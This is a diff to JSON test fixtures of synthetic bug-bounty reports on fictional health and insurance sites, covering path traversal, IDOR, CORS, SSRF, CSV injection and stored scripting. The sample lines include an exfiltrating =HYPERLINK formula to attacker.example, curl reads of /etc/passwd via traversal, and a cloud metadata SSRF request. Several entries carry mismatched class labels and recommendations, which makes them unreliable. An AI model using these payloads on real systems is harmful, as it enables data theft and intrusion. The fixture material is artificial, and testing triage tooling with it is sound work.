+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://telemed.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23979,7 +24159,8 @@
           "offset": "5d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://telemed.seefjord-health.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -24134,7 +24315,8 @@
           "offset": "5d 16h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://telemed.seefjord-health.foo/profile`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24245,7 +24427,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://telemed.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24393,7 +24576,8 @@
           "offset": "6d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://ehr.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24568,7 +24752,8 @@
           "offset": "9d 20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ehr.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24687,7 +24872,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ehr.seefjord-health.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24847,7 +25033,8 @@
           "offset": "7d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ehr.seefjord-health.foo/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24970,7 +25157,8 @@
           "offset": "8d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://ehr.seefjord-health.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25102,7 +25290,8 @@
           "offset": "6d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://telemed.seefjord-health.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/silberkamm_insurance_reports.json b/fixtures/reports/silberkamm_insurance_reports.json
index 1174fa6..c817dea 100644
--- a/fixtures/reports/silberkamm_insurance_reports.json
+++ b/fixtures/reports/silberkamm_insurance_reports.json
@@ -47,7 +47,8 @@
           "offset": "1d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The endpoint GET /api/v1/policies/{policyId}/documents/{docId} authorizes based only on session, not ownership. Incrementing IDs returns other customers' documents.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.silberkamm-insurance.foo/api/v1/policies/`\n- Preconditions: authenticated user: authenticated policy holder; app version: API 1.9\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /api/v1/policies/{myPolicyId}/documents/{myDocId} -> 200\n- GET /api/v1/policies/{myPolicyId}/documents/{myDocId+1} -> 200 different customer's PDF\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -214,7 +215,8 @@
           "offset": "8d 7h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -386,7 +388,8 @@
           "offset": "6d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -481,7 +484,8 @@
           "offset": "1d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -580,7 +584,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -682,7 +687,8 @@
           "offset": "5d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.silberkamm-insurance.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -808,7 +814,8 @@
           "offset": "3d 8h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -992,7 +999,8 @@
           "offset": "7d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1122,7 +1130,8 @@
           "offset": "10d 13h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1249,7 +1258,8 @@
           "offset": "7d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1364,7 +1374,8 @@
           "offset": "19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1478,7 +1489,8 @@
           "offset": "8d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.silberkamm-insurance.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1601,7 +1613,8 @@
           "offset": "1d 3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.silberkamm-insurance.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1729,7 +1742,8 @@
           "offset": "2d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1866,7 +1880,8 @@
           "offset": "19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2001,7 +2016,8 @@
           "offset": "1d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2107,7 +2123,8 @@
           "offset": "6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2229,7 +2246,8 @@
           "offset": "6d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2327,7 +2345,8 @@
           "offset": "3d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2470,7 +2489,8 @@
           "offset": "5d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2597,7 +2617,8 @@
           "offset": "2d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2743,7 +2764,8 @@
           "offset": "21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
